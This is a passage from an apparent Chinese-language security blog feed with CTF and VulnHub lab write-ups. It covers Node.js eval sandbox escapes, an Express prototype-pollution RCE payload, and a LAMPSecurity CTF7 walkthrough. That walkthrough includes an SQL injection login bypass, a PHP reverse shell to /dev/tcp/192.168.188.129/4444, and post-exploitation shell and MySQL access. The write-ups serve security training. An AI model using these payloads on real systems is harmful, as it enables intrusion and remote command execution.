class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">    keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">    <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[<span class="number">0</span>]) === md5(second + keys[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e);</span><br><span class="line">                result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        results.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.results = results;</span><br><span class="line">    res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">    res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>主要的就是<code>first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])</code>，然后绕过一个正则，</p><p>可以使用正则可视化：</p><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20220301191754136.png" alt="image-20220301191754136"></p><p>允许Math.xxx或者一堆字符，或者科学计数法。</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>首先是MD5的绕过。使用了相加，可能就是弱类型，<code>app.use(bodyParser.json());</code>指明了允许在Content-Type是application/json时，可以以json格式解析数据，<code>&#123;&quot;e&quot;: &quot;1+1&quot;, &quot;first&quot;: &quot;1&quot;, &quot;second&quot;: [1]&#125;</code></p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>允许Math，取Function，Function将我们获得的字符串作为函数执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Object</span>]</span><br><span class="line">&gt; <span class="built_in">Math</span>.constructor.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Function</span>]</span><br></pre></td></tr></table></figure><p>可以执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="built_in">Math</span>.constructor.constructor</span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;).toString()&quot;</span>)())</span><br></pre></td></tr></table></figure><p>不允许字符出现，利用String.fromCharCode()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    s = <span class="string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gen(<span class="string">&#x27;cat /flag&#x27;</span>))</span><br></pre></td></tr></table></figure><p>可以利用字符串拼接出string：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>+<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;[object Math]1&#x27;</span></span><br></pre></td></tr></table></figure><p>箭头函数表示自调用<code>(()=&gt;())()</code>，例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;;</span><br><span class="line">b(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x);</span><br><span class="line">c(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span></span><br><span class="line">    (<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,</span><br><span class="line">            <span class="built_in">Math</span>.constructor(</span><br><span class="line">                <span class="built_in">Math</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,</span><br><span class="line">                    <span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">101</span>,</span><br><span class="line">                    <span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,</span><br><span class="line">                    <span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,</span><br><span class="line">                    <span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>))()</span><br><span class="line">    )</span><br><span class="line">)(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code> 下载，在route/index.js，有merge和clone，那就是了，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>需要是admin才能clone，login：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;register&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (safeKeyword(req.body.userid)) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        req.session.user = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: req.body.userid.toUpperCase(),</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">            <span class="string">&#x27;isLogin&#x27;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;login&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.session.user) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;</span><br><span class="line">            req.session.user.isLogin = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>);;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>匹配大小写之后<code>toUpperCase</code>转为大写，p牛的一篇文章：</p><blockquote><p>  Fuzz中的javascript大小写特性</p><p>  <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p></blockquote><p>注册admın</p><p>之后就到了漏洞部分：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>payload的构造：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></p><p>改application/json，之后访问info得flag。</p><p>end.</p><hr><blockquote><p>  <a href="https://www.cnblogs.com/ophxc/p/13298896.html">https://www.cnblogs.com/ophxc/p/13298896.html</a><br>  <a href="https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br>  <a href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a><br>  <a href="https://www.freebuf.com/articles/web/200406.html">https://www.freebuf.com/articles/web/200406.html</a><br>  <a href="https://www.cnblogs.com/tr1ple/p/11360881.html">https://www.cnblogs.com/tr1ple/p/11360881.html</a><br>  <a href="https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/">https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</a><br>  <a href="https://xz.aliyun.com/t/7184#toc-3">https://xz.aliyun.com/t/7184#toc-3</a><br>  <a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a><br>  <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a><br>  <a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a><br>  <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;NodeJs基础&quot;&gt;&lt;a href=&quot;#NodeJs基础&quot; class=&quot;headerlink&quot; title=&quot;NodeJs基础&quot;&gt;&lt;/a&gt;NodeJs基础&lt;/h1&gt;&lt;p&gt;好像也没啥写的。。&lt;/p&gt;
&lt;h2 id=&quot;child-proce</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub_03_LAMPSECURITY: CTF7</title>
    <link href="http://example.com/2022/02/19/VulnHub03/"/>
    <id>http://example.com/2022/02/19/VulnHub03/</id>
    <published>2022-02-18T16:00:00.000Z</published>
    <updated>2022-02-19T11:26:17.501Z</updated>
    
    <content type="html"><![CDATA[<p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</code></p><p>找到ip为：<code>192.168.188.132</code></p><blockquote><p>  nmap参数：</p><p>  -Pn ：不检测主机存活</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -Pn -sV 192.168.188.132                                                                               130 ⨯</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:56 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.132</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp   open   http        Samba SWAT administration server</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">10000/tcp open   http        MiniServ 1.610 (Webmin httpd)</span><br><span class="line">MAC Address: 00:0C:29:9D:12:A9 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 46.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8080有个web服务，登录框：<code>&#39; or 1=1 -- .</code>，直接注入进去</p><p>在reading上传shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="/2022/02/19/VulnHub03/image-20220219171650551.png" alt="image-20220219171650551"></p><p>但是不知道上传的位置，扫一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># dirb http://192.168.188.132                                                                                255 ⨯</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Feb 19 04:17:38 2022</span><br><span class="line">URL_BASE: http://192.168.188.132/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.188.132/ ----</span><br><span class="line">+ http://192.168.188.132/about (CODE:200|SIZE:4910)                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/assets/                                                                       </span><br><span class="line">+ http://192.168.188.132/backups (CODE:301|SIZE:335)                                                                </span><br><span class="line">+ http://192.168.188.132/cgi-bin/ (CODE:403|SIZE:291)                                                               </span><br><span class="line">+ http://192.168.188.132/contact (CODE:200|SIZE:5017)                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/css/                                                                          </span><br><span class="line">+ http://192.168.188.132/db (CODE:200|SIZE:3904)                                                                    </span><br><span class="line">+ http://192.168.188.132/default (CODE:200|SIZE:6058)                                                               </span><br><span class="line">+ http://192.168.188.132/footer (CODE:200|SIZE:3904)                                                                </span><br><span class="line">+ http://192.168.188.132/header (CODE:200|SIZE:3904)                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/img/                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/inc/                                                                          </span><br><span class="line">+ http://192.168.188.132/index.php (CODE:200|SIZE:6058)                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/js/                                                                           </span><br><span class="line">+ http://192.168.188.132/newsletter (CODE:200|SIZE:4037)                                                            </span><br><span class="line">+ http://192.168.188.132/phpinfo (CODE:200|SIZE:58773)                                                              </span><br><span class="line">+ http://192.168.188.132/profile (CODE:200|SIZE:3977)              </span><br></pre></td></tr></table></figure><p>注意到：<a href="http://192.168.188.132/assets/">http://192.168.188.132/assets/</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lp 4444</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.1$ ls</span><br><span class="line">ls</span><br><span class="line">0223_cybersecurity_china_us_lieberthal_singer_pdf_english.pdf</span><br><span class="line">1.php</span><br><span class="line">88x31.png</span><br><span class="line">apple-touch-icon-114-precomposed.png</span><br><span class="line">apple-touch-icon-144-precomposed.png</span><br><span class="line">apple-touch-icon-57-precomposed.png</span><br><span class="line">apple-touch-icon-72-precomposed.png</span><br><span class="line">higher-eduction-national-security.pdf</span><br><span class="line">re.php</span><br><span class="line">reverse_php_shell.php</span><br><span class="line">bash-4.1$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">bash-4.1$ mysql -u root</span><br><span class="line">mysql -u root</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 242</span><br><span class="line">Server version: 5.1.66 Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the 